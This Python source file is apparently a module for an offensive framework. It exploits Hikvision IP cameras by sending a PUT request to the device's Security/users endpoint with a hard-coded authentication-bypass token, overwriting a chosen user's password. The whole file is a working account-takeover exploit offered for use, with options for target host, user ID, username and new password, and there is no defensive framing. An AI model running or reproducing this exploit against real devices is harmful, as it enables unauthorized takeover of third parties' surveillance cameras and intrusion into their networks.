import requests
import base.response

from requests.models import Response

from base import core

AUTH_KEY = "YWRtaW46MTEK"

def get_url_base(addr: str, usr: str) -> str:
    '''
    So the base is:
        http://<IP-ADDRESS>/Security/users/<USR-ID>?auth=YWRtaW46MTEK

    But by the way
        http://<IP-ADDRESS>/ISAPI/Security/users/<USR-ID>?auth=YWRtaW46MTEK
    also returns information from that target user. 
    '''
    return f"http://{addr}/Security/users/{usr}?auth={AUTH_KEY}"


def get_user_xml(id: str, name: str, pwd: str) -> str:
    return f"""<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">
    <id>{id}</id>
    <userName>{name}</userName>
    <password>{pwd}</password>
</User>"""

def put_user(url_t: str, userXml: str) -> Response:
    data = requests.put(url_t, userXml)
    if not data:
        print("[!] Error while executing. Maybe wrong ip-address?\n")
        return None, None
    else:
        return data.status_code, data.text

class UserInjectModule(core.BaseModule):
    def __init__(self) -> None:
        super().__init__("/injection/password_changer", 4)

        self.RHOST = 0
        self.UNAME = 1
        self.UID   = 2
        self.PWD   = 3

    def _set_(self, a: str):
        if a[1] in ["RHOST", "rhost"]:
            self.set_option(0, str(a[2]))
            print(" " + f"RHOST → {self.get_option(0)}\n")
        elif a[1] in ["UNAME", "uname"]:
            self.set_option(self.UNAME, str(a[2]))
            print(" " + f"UNAME → {self.get_option(self.UNAME)}\n")
        elif a[1] in ["UID", "uid"]:
            self.set_option(self.UID, str(a[2]))
            print(" " + f"UID → {self.get_option(self.UID)}\n")
        elif a[1] in ["PWD", "pwd"]:
            self.set_option(self.PWD, str(a[2]))
            print(" " + f"PWD → {self.get_option(self.PWD)}\n")
        else:
            print(" [!] Error: unknown command!\n")
        
    def show_options(self): 
        l_option = self.len_of(["Rhost", "uname", "uid", "pwd"])
        l_required = self.len_of(["yes", "no", "Required"])
        l_value = self.len_of([self.get_option(self.RHOST), self.get_option(self.PWD),
                                self.get_option(self.UNAME), self.get_option(self.UID),
                                "value"])

        self.print_table(l_option, l_required, l_value, 
                        [["OPTION", "REQUIRED", "VALUE"],
                        ["RHOST", "yes", self.get_option(self.RHOST)],
                        ["UID", "yes", self.get_option(self.UID)],
                        ["UNAME", "yes", self.get_option(self.UNAME)],
                        ["PWD", "yes", self.get_option(self.PWD)]])

    def run(self):
        if not core.nonNull(self.get_option(self.RHOST)):
            print(" [!] Error: host not specified\n")
            return

        if not core.nonNull(self.get_option(self.UNAME)):
            print(" [!] Error: username not specified\n")
            return

        if not core.nonNull(self.get_option(self.UID)):
            print(" [!] Error: userID not specified\n")
            return

        if not core.nonNull(self.get_option(self.PWD)):
            print(" [!] Error: new password not specified\n")
            return

        print("\n[*] Collecting data...")

        xml = get_user_xml(self.get_option(2), self.get_option(1), self.get_option(3))
        url_t = get_url_base(self.get_option(0), self.get_option(2))

        print("[*] Printing 404 error code if host is not available...\n")
        header, text = put_user(url_t=url_t, userXml=xml)
        if not text:
            print("[!] 404\n")
            return
        else:
            print( " ┌──:Root\n │")
            print(f" ├─ Status code:{header}\n │")
            print(f" ├─ XMLResponse:")
            xml = core.parse(text)
            resp = base.response.XmlResponse(requestUrl=xml[0].text, statusString=xml[2].text, 
                                            statusCode=xml[1].text, subStatusCode="---")
            print(resp.toXml())
            print(f"[*] Successfully updated password to {self.get_option(self.PWD)}!")

